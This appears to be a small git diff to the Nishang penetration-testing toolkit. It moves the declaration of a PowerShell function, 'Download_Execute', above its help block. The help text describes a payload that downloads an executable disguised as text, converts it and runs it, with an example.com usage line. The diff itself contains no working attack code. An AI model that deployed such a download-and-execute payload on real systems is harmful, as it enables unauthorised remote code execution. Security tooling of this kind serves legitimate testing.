@@ -1,4 +1,6 @@
 
+function Download_Execute
+{
 <#
 .SYNOPSIS
 Nishang Payload to download an executable in text format, convert it to executable and execute.
@@ -17,11 +19,6 @@ PS > Download_Execute http://example.com/file.txt
 http://labofapenetrationtester.blogspot.com/
 https://github.com/samratashok/nishang
 #>
-
-
-
-function Download_Execute
-{
     [CmdletBinding()] Param(
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
